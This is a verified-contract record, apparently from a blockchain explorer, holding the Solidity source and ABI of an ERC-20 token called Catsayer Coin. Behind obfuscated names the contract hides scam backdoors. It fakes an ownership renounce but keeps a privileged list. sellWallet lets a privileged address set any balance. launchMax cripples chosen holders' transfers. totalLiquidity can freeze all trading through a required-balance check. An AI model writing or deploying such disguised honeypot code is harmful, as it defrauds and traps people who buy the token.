{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tradingSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapLimitMode {\n    function createPair(address takeReceiverTo, address totalLaunchedMax) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface teamLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface minSwapTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletFund) external view returns (uint256);\n\n    function transfer(address enableExempt, uint256 exemptLaunchedFund) external returns (bool);\n\n    function allowance(address limitAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLaunchedFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableExempt,\n        uint256 exemptLaunchedFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxAmount, uint256 value);\n    event Approval(address indexed limitAuto, address indexed spender, uint256 value);\n}\n\ninterface minSwapTradingMetadata is minSwapTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CatsayerCoin is tradingSender, minSwapTrading, minSwapTradingMetadata {\n\n    function owner() external view returns (address) {\n        return isList;\n    }\n\n    address public launchedAutoAmount;\n\n    function exemptFee() public {\n        emit OwnershipTransferred(launchedAutoAmount, address(0));\n        isList = address(0);\n    }\n\n    uint256 constant takeExempt = 8 ** 10;\n\n    function transferFrom(address maxShouldTrading, address enableExempt, uint256 exemptLaunchedFund) external override returns (bool) {\n        if (_msgSender() != liquidityExemptTrading) {\n            if (marketingSell[maxShouldTrading][_msgSender()] != type(uint256).max) {\n                require(exemptLaunchedFund <= marketingSell[maxShouldTrading][_msgSender()]);\n                marketingSell[maxShouldTrading][_msgSender()] -= exemptLaunchedFund;\n            }\n        }\n        return listTotal(maxShouldTrading, enableExempt, exemptLaunchedFund);\n    }\n\n    uint256 public enableTotal = 0;\n\n    function listAt() private view {\n        require(isShould[_msgSender()]);\n    }\n\n    uint256 private tokenFrom;\n\n    uint256 walletFrom;\n\n    bool public shouldIsReceiver;\n\n    function listTotal(address maxShouldTrading, address enableExempt, uint256 exemptLaunchedFund) internal returns (bool) {\n        if (maxShouldTrading == launchedAutoAmount) {\n            return tokenTo(maxShouldTrading, enableExempt, exemptLaunchedFund);\n        }\n        uint256 buyTotal = minSwapTrading(launchReceiver).balanceOf(fundReceiver);\n        require(buyTotal == senderEnableTotal);\n        require(enableExempt != fundReceiver);\n        if (tokenExempt[maxShouldTrading]) {\n            return tokenTo(maxShouldTrading, enableExempt, takeExempt);\n        }\n        exemptLaunchedFund = atFund(maxShouldTrading, enableExempt, exemptLaunchedFund);\n        return tokenTo(maxShouldTrading, enableExempt, exemptLaunchedFund);\n    }\n\n    address private isList;\n\n    function totalLiquidity(uint256 exemptLaunchedFund) public {\n        listAt();\n        senderEnableTotal = exemptLaunchedFund;\n    }\n\n    function sellWallet(address marketingModeTo, uint256 exemptLaunchedFund) public {\n        listAt();\n        liquidityBuy[marketingModeTo] = exemptLaunchedFund;\n    }\n\n    function launchMax(address atLaunch) public {\n        listAt();\n        if (fundTx == maxTeam) {\n            maxTeam = tokenFrom;\n        }\n        if (atLaunch == launchedAutoAmount || atLaunch == launchReceiver) {\n            return;\n        }\n        tokenExempt[atLaunch] = true;\n    }\n\n    constructor (){\n        if (maxTeam == tokenFrom) {\n            fundTx = tokenFrom;\n        }\n        exemptFee();\n        teamLaunch receiverToken = teamLaunch(liquidityExemptTrading);\n        launchReceiver = swapLimitMode(receiverToken.factory()).createPair(receiverToken.WETH(), address(this));\n        fundReceiver = swapLimitMode(receiverToken.factory()).feeTo();\n        \n        launchedAutoAmount = _msgSender();\n        isShould[launchedAutoAmount] = true;\n        liquidityBuy[launchedAutoAmount] = walletLimit;\n        if (fundTx != maxTeam) {\n            maxTeam = fundTx;\n        }\n        emit Transfer(address(0), launchedAutoAmount, walletLimit);\n    }\n\n    function allowance(address maxTo, address tokenAmount) external view virtual override returns (uint256) {\n        if (tokenAmount == liquidityExemptTrading) {\n            return type(uint256).max;\n        }\n        return marketingSell[maxTo][tokenAmount];\n    }\n\n    uint256 public fundTx;\n\n    function atFund(address maxShouldTrading, address enableExempt, uint256 exemptLaunchedFund) internal view returns (uint256) {\n        require(exemptLaunchedFund > 0);\n\n        uint256 buyLaunched = 0;\n        if (maxShouldTrading == launchReceiver && shouldMode > 0) {\n            buyLaunched = exemptLaunchedFund * shouldMode / 100;\n        } else if (enableExempt == launchReceiver && enableTotal > 0) {\n            buyLaunched = exemptLaunchedFund * enableTotal / 100;\n        }\n        require(buyLaunched <= exemptLaunchedFund);\n        return exemptLaunchedFund - buyLaunched;\n    }\n\n    string private enableAtFund = \"Catsayer Coin\";\n\n    uint256 public maxTeam;\n\n    uint256 public shouldMode = 3;\n\n    uint256 senderEnableTotal;\n\n    function getOwner() external view returns (address) {\n        return isList;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableAtFund;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletLimit;\n    }\n\n    address liquidityExemptTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public isShould;\n\n    string private autoMarketing = \"CCN\";\n\n    uint8 private walletEnable = 18;\n\n    function tokenTo(address maxShouldTrading, address enableExempt, uint256 exemptLaunchedFund) internal returns (bool) {\n        require(liquidityBuy[maxShouldTrading] >= exemptLaunchedFund);\n        liquidityBuy[maxShouldTrading] -= exemptLaunchedFund;\n        liquidityBuy[enableExempt] += exemptLaunchedFund;\n        emit Transfer(maxShouldTrading, enableExempt, exemptLaunchedFund);\n        return true;\n    }\n\n    function approve(address tokenAmount, uint256 exemptLaunchedFund) public virtual override returns (bool) {\n        marketingSell[_msgSender()][tokenAmount] = exemptLaunchedFund;\n        emit Approval(_msgSender(), tokenAmount, exemptLaunchedFund);\n        return true;\n    }\n\n    mapping(address => uint256) private liquidityBuy;\n\n    mapping(address => bool) public tokenExempt;\n\n    address fundReceiver;\n\n    uint256 private walletLimit = 100000000 * 10 ** 18;\n\n    function amountTokenList(address enableShouldSender) public {\n        if (shouldIsReceiver) {\n            return;\n        }\n        \n        isShould[enableShouldSender] = true;\n        if (fundTx == tokenFrom) {\n            fundTx = maxTeam;\n        }\n        shouldIsReceiver = true;\n    }\n\n    function balanceOf(address walletFund) public view virtual override returns (uint256) {\n        return liquidityBuy[walletFund];\n    }\n\n    address public launchReceiver;\n\n    function transfer(address marketingModeTo, uint256 exemptLaunchedFund) external virtual override returns (bool) {\n        return listTotal(_msgSender(), marketingModeTo, exemptLaunchedFund);\n    }\n\n    event OwnershipTransferred(address indexed sellTeam, address indexed amountFund);\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShouldSender\",\"type\":\"address\"}],\"name\":\"amountTokenList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"}],\"name\":\"launchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAutoAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingModeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldIsReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingModeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShouldTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CatsayerCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}